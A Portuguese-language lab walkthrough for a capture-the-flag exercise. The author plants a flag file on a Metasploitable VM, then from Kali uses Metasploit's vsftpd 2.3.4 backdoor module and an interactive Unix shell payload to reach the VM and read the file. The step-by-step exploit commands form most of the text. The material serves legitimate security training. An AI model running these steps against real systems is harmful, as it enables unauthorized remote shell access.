&nbsp; 

### 1º - Abrir e logar na VM do metasploitable com o login padrão.

login: msfadmin

senha: msfadmin

![login metasploitable](https://i.imgur.com/8GQ3uHb.jpeg) 

&nbsp;

### 2º - Criar um arquivo de texto no metasploitable com o objetivo de encontrarmos este arquivo à partir de outra máquina (Capture the Flag)

Comando para criar o arquivo txt: echo "Conteúdo do seu arquivo aqui" > nome_do_arquivo.txt

Exemplo: echo "Me encontre" > Flag.txt

Comando para visualizar os arquivos criados: ls

Comando para acessar os arquivos: nano nome_do_arquivo.txt

Comando para sair do arquivo: Ctrl X

Comando para excluir arquivos: rm nome_do_arquivo.txt

![criar arquivo](https://i.imgur.com/3KJeOIA.jpeg)

![acessar arquivo](https://i.imgur.com/ik80Ey4.jpeg)

&nbsp;

### 3º - No Terminal no Kali Linux, iniciar o Metasploit através do comando: msfconsole

![]()

&nbsp;

### 4º - Buscar um exploit para explorar o vsftpd

Comando: search vsftpd

![]()

&nbsp;

### 5º - Descobrir mais informações sobre esse exploit. Aqui descobrimos o que ele pede, nesse caso é um host e uma porta, que é a 21 por padrão.

Comando: info exploit/unix/ftp/vsftpd_234_backdoor

![]()

&nbsp;

### 6º - Após descobrir as informações, vamos usá-lo. Para usá-lo, basta substituir a palavra info por use no comando. Ao aparecer as letras vermelhas entre parênteses significa que já estamos utilizando o backdoor.

Comando: use exploit/unix/ftp/vsftpd_234_backdoor

![]()

&nbsp;

### 7º - Em seguida, acionamos o comando show options para nos certificarmos que o host ainda não está associado a nenhum número IP e que precisamos configurar nosso IP de destino. 

Comando: show options

![]()

&nbsp;

### 8º - Configurando IP de destino. Para localizarmos o IP da máquina a ser acessada, precisamos localizar seu IP no metasploitable com o seguinte comando: 

Comando: ip addr

![]()

&nbsp;

### 9º - Agora que temos o número IP, digitamos o seguinte comando no terminal do Kali Linux para efetuarmos a configuração do host remoto:

Comando: set rhosts nú.me.ro.ip

Obs. rhosts é referente a remote hosts.

![]()

&nbsp;

### 10º - Em seguida, visualizamos os módulos payloads:

Comando: show payloads 

Com este comando encontramos o nome do payload e descobrimos que ele é um comando Unix e que interage com conexão estabelecida, ou seja, consigo de forma remota acessar um outro computador explorando backdoor. 

![]()

&nbsp;

### 11º - Na sequência utilizamos o payload encontrado.

Comando: set payload payload/cmd/unix/interact

![]()

&nbsp;

### 12º - Acionamos o comando show options novamente para vermos o IP configurado e definido no host

Comando: show options

![]()

&nbsp;

### 13º - O próximo passo é executar o payload (exploit). Se aparecer Found shell é porque conseguiu se conectar. 

Comando: exploit

![]() 

&nbsp;

### 14º - Digitar o comando ip addr para confirmar que consegui acesso ao host remoto, nesse caso o metasploitable. 

Comando: ip addr

![]() 

&nbsp;

### 15º - Chegando até o arquivo flag.txt criado no metasploitable (Capture the flag) pelo terminal do Kali Linux.

Comando: ls (encontramos a pasta home)
Comando: cd home (entramos na pasta home)
Comando: ls (encontramos a pasta msfadmin)
Comando: cd msfadmin (entramos na pasta msfadmin)
Comando: ls (encontramos o arquivo criado no metasploitable que foi nomeado como flag.txt)
Comando: nano flag.txt (Abrimos e visualizamos o conteúdo do arquivo) 

![]() 

![]()

&nbsp;
